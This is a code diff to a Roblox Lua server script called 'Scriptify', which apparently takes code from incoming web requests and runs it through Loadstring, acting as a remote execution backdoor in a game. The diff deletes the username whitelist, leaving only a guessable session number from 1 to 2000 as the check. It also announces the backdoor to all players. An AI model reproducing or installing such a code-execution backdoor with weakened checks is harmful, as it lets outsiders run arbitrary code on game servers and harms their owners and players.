@@ -6,14 +6,6 @@ local ModulesFolder = script.Parent.Modules
 
 local LuaExp = require(ModulesFolder.LuaExp)
 local Loadstring = require(ModulesFolder.Loadstring)
-
-local Whitelist = {
-	"DanXvoalt",
-	"Tubers93_alt26",
-	"8heckerruenpl",
-	"ServerifySoftworks"
-}
-
 local attached = false
 local currsessionid = tostring(math.random(1, 2000))
 
@@ -32,12 +24,10 @@ coroutine.wrap(function ()
 				attached = true
 				local event = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("CreateNotification")
 				for _, plr in pairs(Players:GetPlayers()) do
-					if table.find(Whitelist, plr.Name) then
 						event:FireClient(plr, {
 							Title = "Scriptify",
 							Body = "Scriptify attached to game! You can execute scripts now!"
 						})
-					end
 				end
 			end
 		end
@@ -48,7 +38,7 @@ coroutine.wrap(function ()
 		local code = req.body['code']
 		local username = req.body['user']
 		local sessionid = req.body['sessionid']
-		if table.find(Whitelist, username) and Players:FindFirstChild(username) and sessionid == currsessionid then
+		if sessionid == currsessionid then
 			Loadstring(code)()
 			event:FireClient(Players:FindFirstChild(username), {
 				Title = "Scriptify",
